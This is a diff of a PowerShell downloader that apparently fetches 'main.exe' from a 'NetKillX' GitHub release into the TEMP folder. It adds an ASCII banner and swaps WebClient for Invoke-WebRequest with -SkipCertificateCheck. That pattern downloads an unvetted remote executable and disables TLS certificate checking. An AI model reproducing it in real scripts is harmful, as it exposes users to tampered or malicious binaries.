@@ -4,6 +4,16 @@ $DownloadUrl = "https://github.com/NetKillX/netkillx.github.io/releases/download
 $FileName    = "main.exe"
 # ---------------------
 
+# --- ASCII Art Banner ---
+Write-Host ""
+Write-Host "    _   _________  __   ____  ____  ____  ________    ____  ___    ____  __________ " -ForegroundColor Cyan
+Write-Host "   / | / /_  __/ |/ /   / __ )/ __ \/ __ \/_  __/ /    / __ \/   |  / __ \/ ____/ __ \ " -ForegroundColor Cyan
+Write-Host "  /  |/ / / /  |  </  / __  / / / / / / / / / / /    / / / / /| | / / / / __/ / /_/ / " -ForegroundColor Cyan
+Write-Host " / /|  / / /  /  |  / /_/ / /_/ / /_/ / / / / /___/ /_/ / ___ |/ /_/ / /___/ _, _/ " -ForegroundColor Cyan
+Write-Host "/_/ |_/ /_/  /_/|_| /_____/\____/\____/ /_/ /_____/\____/_/  |_/_____/_____/_/ |_| " -ForegroundColor Cyan
+Write-Host ""
+# ------------------------
+
 # The entire logic is wrapped in a self-invoking script block (& { ... }) for clean execution.
 & {
     $TempDir = "$env:TEMP"
@@ -19,7 +29,6 @@ $FileName    = "main.exe"
     }
     else {
         # File not found, proceed with download
-        $WebClient = New-Object System.Net.WebClient
         
         Write-Host "Starting download from $DownloadUrl..." -ForegroundColor Cyan
 
@@ -27,11 +36,14 @@ $FileName    = "main.exe"
             # FIX: Correct type name is [Net.SecurityProtocolType]
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
             
-            # Download the file
-            $WebClient.DownloadFile($DownloadUrl, $ExePath)
+            # Download the file using Invoke-WebRequest, which supports the progress bar.
+            # We pipe the output to Out-Null to suppress the object output but keep the progress bar.
+            Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing -SkipCertificateCheck | Out-Null
+            
             Write-Host "Download complete. File saved to: $ExePath" -ForegroundColor Green
         }
         catch {
+            # Write-Host does not show the progress bar from IWR, but it handles errors.
             Write-Host "An error occurred during download: $($_.Exception.Message)" -ForegroundColor Red
             # Exit the script block on download failure
             return 
